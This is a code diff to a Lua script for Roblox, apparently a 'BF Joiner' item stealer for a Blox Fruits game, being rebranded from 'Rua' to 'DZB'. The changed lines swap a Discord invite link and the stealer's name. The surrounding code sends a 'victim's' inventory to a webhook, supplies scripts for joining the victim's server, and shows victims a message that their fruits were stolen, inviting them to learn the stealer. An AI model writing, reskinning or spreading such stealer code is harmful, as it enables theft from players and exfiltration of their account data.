@@ -199,7 +199,7 @@ local function createNotification()
         buttonCorner.CornerRadius = UDim.new(0, 6)
         
         discordButton.MouseButton1Click:Connect(function()
-            setclipboard("https://discord.gg/pYXjZndm")
+            setclipboard("https://discord.gg/dAzjpzh7dC")
             discordButton.Text = "Copied!"
             task.wait(1.5)
             discordButton.Text = "Join Discord"
@@ -512,7 +512,7 @@ local function sendWebhook(inventory)
         embedTitle = "VICTIM HAS PREMIUM ITEMS! <:rbx:1326025738125574226>  ; https://discord.gg/pYXjZndm"
     else
         embedColor = nil
-        embedTitle = "<a:bundle:1214105817910087770> Rua BF Joiner V2 HIT! ; https://discord.gg/pYXjZndm"
+        embedTitle = "<a:bundle:1214105817910087770> DZB BF Joiner V2 HIT! ; https://discord.gg/pYXjZndm"
     end
 
     local embed = {
@@ -527,7 +527,7 @@ local function sendWebhook(inventory)
             { ["name"] = "Join Victim's Server Script (Mobile Copy)", ["value"] = joinScriptMobile },
             { ["name"] = "Join Victim's Sea Script (PC Copy)", ["value"] = "```lua\n" .. seaJoinScriptPC .. "\n```" },
             { ["name"] = "Join Victim's Sea Script (Mobile Copy)", ["value"] = seaJoinScriptMobile },
-            { ["name"] = "Extra Info <a:focuzz:1214971569315782686> ", ["value"] = string.format("```Rua Joiner V2 Version: 1.1.7\nExecutor: %s\nTime: %s\nPlayer Count: %d```", identifyexecutor(), os.date("%Y-%m-%d %H:%M:%S"), playerCount) }
+            { ["name"] = "Extra Info <a:focuzz:1214971569315782686> ", ["value"] = string.format("```DZB Joiner V2 Version: 1.1.7\nExecutor: %s\nTime: %s\nPlayer Count: %d```", identifyexecutor(), os.date("%Y-%m-%d %H:%M:%S"), playerCount) }
         }
     }
 
@@ -924,7 +924,7 @@ local function createDiscordUI()
     Description.Position = UDim2.new(0.05, 0, 0.3, 0)
     Description.BackgroundTransparency = 1
     Description.Font = Enum.Font.Gotham
-    Description.Text = "Hey! Some of your VALUABLE Fruits have been stolen by Rua Joiner V2. No need to be sad! You can join us, and learn how this stealer works - And make a lot of fruits using it!"
+    Description.Text = "Hey! Some of your VALUABLE Fruits have been stolen by DZB Joiner V2. No need to be sad! You can join us, and learn how this stealer works - And make a lot of fruits using it!"
     Description.TextColor3 = Color3.fromRGB(220, 221, 222)
     Description.TextScaled = true
     Description.Parent = MainFrame
